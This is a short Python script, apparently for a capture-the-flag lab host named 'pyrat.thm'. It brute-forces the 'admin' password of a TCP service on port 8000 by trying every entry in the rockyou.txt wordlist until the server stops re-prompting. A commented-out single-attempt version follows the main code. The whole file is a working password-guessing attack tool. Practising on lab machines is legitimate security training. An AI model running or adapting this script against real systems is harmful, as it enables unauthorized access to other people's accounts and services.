import socket
import time

host = "pyrat.thm"
port = 8000

# Create a socket object for a TCP connection

def try_password(password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    time.sleep(0.1)

    s.sendall("admin".encode('ascii') + b"\n")
    response = s.recv(8192).decode('ascii')
    time.sleep(0.1)

    s.sendall(password.encode('ascii') + b"\n")
    time.sleep(0.2)

    response = s.recv(4096).decode('ascii').strip()
    s.close()
    if response == "Password:":
        return False
    else:
        return True


file_path = '/usr/share/wordlists/rockyou.txt'

# Open the file and iterate through each line
with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
    for line in file:
        # Strip whitespace and print the line
        password = line.strip()
        
        print("Password: " + password)
        trying = try_password(password)
        if trying:
            print("[+] SUCCESS!!!! | " + password)
            break



# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# print(f"[~] Connecting to {host}:{port}")
# s.connect((host, port))
# time.sleep(0.1)

# # Send the username
# username = "admin"
# print(f"[~] Sending: {username}")
# s.sendall(username.encode('ascii'))

# response = s.recv(8192).decode('ascii')
# print(response.encode('ascii'))

# # Send the password
# password = "abc123"
# print(f"[~] Sending: {password}")
# s.sendall(password.encode('ascii'))

# # Wait for response
# print("[~] Waiting for response")
# time.sleep(0.5)

# # Receive the response
# response = s.recv(8192).decode('ascii')

# # Optional: Print out the raw bytes received
# print("[+] Raw response bytes:")
# print(response.encode('ascii'))

# # Close the connection
# s.close()